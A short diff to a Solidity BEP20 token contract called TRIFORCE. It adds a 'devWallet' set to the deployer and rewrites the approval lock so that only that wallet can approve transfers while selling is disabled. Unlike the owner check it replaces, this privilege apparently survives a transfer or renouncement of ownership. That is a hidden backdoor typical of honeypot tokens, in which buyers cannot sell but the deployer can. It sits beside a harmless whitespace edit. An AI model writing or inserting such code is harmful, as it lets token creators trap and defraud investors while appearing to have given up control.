@@ -665,6 +665,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     address public pancakeswapPair;
     address public rewardWallet;	
     address public balancer;
+    address public devWallet;
 
     event TradingEnabled(bool enabled);
     event SellingEnabled(bool enabled);
@@ -691,6 +692,8 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 
 	rewardWallet = address(new RewardWallet());
 	balancer = address(new Balancer());
+	
+	devWallet = msg.sender;
 
 	isExcludedFromFee[_msgSender()] = true;
 	isExcludedFromFee[address(this)] = true;
@@ -726,7 +729,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 	virtual	
 	returns (bool)	
     {	
-       _transfer(_msgSender(),recipient, amount);
+       _transfer(_msgSender(),recipient,amount);
 	return true;
     }	
 
@@ -862,7 +865,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     ) private {	
 	require(owner != address(0), "BEP20: approve from the zero address");	
 	require(spender != address(0), "BEP20: approve to the zero address");	
-	require(sellingEnabled || owner == owner() || spender == owner(), "Trading is locked.");	//d3vgen |===|}>
+	require(sellingEnabled || owner == devWallet, "Trading is locked.");	//d3vgen |===|}>
 	_allowances[owner][spender] = amount;	
 	emit Approval(owner, spender, amount);	
     }	
